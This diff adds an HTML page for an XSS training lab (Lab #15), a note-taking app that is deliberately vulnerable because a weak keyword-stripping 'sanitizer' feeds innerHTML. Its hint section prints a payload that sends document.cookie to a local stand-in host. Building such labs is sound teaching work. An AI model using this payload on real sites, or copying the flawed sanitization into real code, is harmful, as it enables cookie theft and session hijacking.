@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pro-Level XSS Challenge Lab - Advanced XSS Practice Lab for Ethical Cybersecurity Training by Satyajit Sethy">
+    <meta name="author" content="Satyajit Sethy">
+    <title>Lab #15 - Pro-Level Challenge | XSS Practice Lab</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="lab-container">
+        <header class="lab-header">
+            <h1 class="glitch" data-text="LAB #15: PRO CHALLENGE">LAB #15: PRO-LEVEL XSS CHALLENGE</h1>
+            <div class="warning-banner">
+                ⚠️ This platform is for ethical cybersecurity learning purposes only. ⚠️
+            </div>
+        </header>
+
+        <main>
+            <section class="lab-description">
+                <h2>Ultimate XSS Challenge</h2>
+                <p>This lab combines multiple security mechanisms. Your goal is to find and exploit the XSS vulnerability.</p>
+                <div class="lab-objective">
+                    Goal: Execute alert(document.domain) to complete the challenge.
+                </div>
+            </section>
+
+            <section class="vulnerable-section">
+                <h3>Secure Note Taking App</h3>
+                <p>This application claims to be secure against XSS attacks.</p>
+                
+                <div class="input-group">
+                    <label for="proInput">Create a note:</label>
+                    <textarea id="proInput" rows="4" cols="50" placeholder="Write your note here..."></textarea>
+                    <button onclick="createNote()">Create Note</button>
+                    <button onclick="viewNotes()">View Notes</button>
+                    <button onclick="getHint()">Get Hint</button>
+                    <button class="reset-button" data-lab="lab15">Reset</button>
+                </div>
+
+                <div class="output-area">
+                    <span class="output-label">Your Notes</span>
+                    <div id="proOutput"></div>
+                </div>
+                
+                <div id="proHint" class="hidden" style="margin-top: 20px; padding: 10px; border: 1px solid #ffff00; color: #ffff00;">
+                    <h4 style="color: #ffff00;">Hint System</h4>
+                    <p>Hint 1: Check the network tab for API calls</p>
+                    <p>Hint 2: Look at the JavaScript console for errors</p>
+                    <p>Hint 3: Try: &lt;img src=x onerror=this.src='http://localhost:8000/steal?'+document.cookie&gt;</p>
+                    <p>Hint 4: The app uses DOMPurify but has a configuration issue</p>
+                </div>
+            </section>
+
+            <section class="lab-description">
+                <h3>Security Features</h3>
+                <ul>
+                    <li>Input sanitization with DOMPurify</li>
+                    <li>Content Security Policy</li>
+                    <li>XSS protection headers</li>
+                    <li>Input length limits</li>
+                    <li>Character blacklisting</li>
+                </ul>
+                
+                <h3>📝 Challenge Rules</h3>
+                <ul>
+                    <li>No external tools allowed</li>
+                    <li>Must work in modern browsers</li>
+                    <li>Must trigger alert(document.domain)</li>
+                </ul>
+            </section>
+        </main>
+
+        <footer>
+            <div class="footer-content">
+                <p>© 2026 - <span id="currentYear"></span> | Created by Satyajit Sethy</p>
+                <a href="https://github.com/sethysatyajit" target="_blank" rel="noopener noreferrer" class="github-link">GitHub</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="../script.js"></script>
+    <script>
+        // Simulated DOMPurify (basic version for demo)
+        const DOMPurify = {
+            sanitize: function(input) {
+                // Basic sanitization with a flaw
+                let sanitized = input.replace(/<script>/gi, '');
+                sanitized = sanitized.replace(/<\/script>/gi, '');
+                sanitized = sanitized.replace(/onerror/gi, '');
+                sanitized = sanitized.replace(/onload/gi, '');
+                sanitized = sanitized.replace(/javascript:/gi, '');
+                return sanitized;
+            }
+        };
+        
+        let notes = [];
+        
+        function createNote() {
+            const note = document.getElementById('proInput').value;
+            
+            // Apply "security" measures
+            if (note.length > 200) {
+                alert('Note too long! Maximum 200 characters.');
+                return;
+            }
+            
+            // Sanitize with simulated DOMPurify
+            const sanitizedNote = DOMPurify.sanitize(note);
+            
+            // Store note
+            notes.push(sanitizedNote);
+            
+            // Save to localStorage
+            localStorage.setItem('proNotes', JSON.stringify(notes));
+            
+            alert('Note created successfully!');
+            document.getElementById('proInput').value = '';
+        }
+        
+        function viewNotes() {
+            const output = document.getElementById('proOutput');
+            
+            // Load from localStorage
+            const stored = localStorage.getItem('proNotes');
+            if (stored) {
+                notes = JSON.parse(stored);
+            }
+            
+            // Display notes (VULNERABLE - despite sanitization)
+            let html = '<div class="notes-list">';
+            notes.forEach((note, index) => {
+                // Vulnerability: The sanitization can be bypassed
+                html += `<div class="note-item">Note #${index + 1}: ${note}</div>`;
+            });
+            html += '</div>';
+            
+            output.innerHTML = html;
+            
+            console.log('Displaying notes:', notes);
+        }
+        
+        function getHint() {
+            document.getElementById('proHint').classList.toggle('hidden');
+        }
+        
+        // Load notes on page load
+        window.onload = function() {
+            const stored = localStorage.getItem('proNotes');
+            if (stored) {
+                notes = JSON.parse(stored);
+            }
+        };
+    </script>
+</body>
+</html>
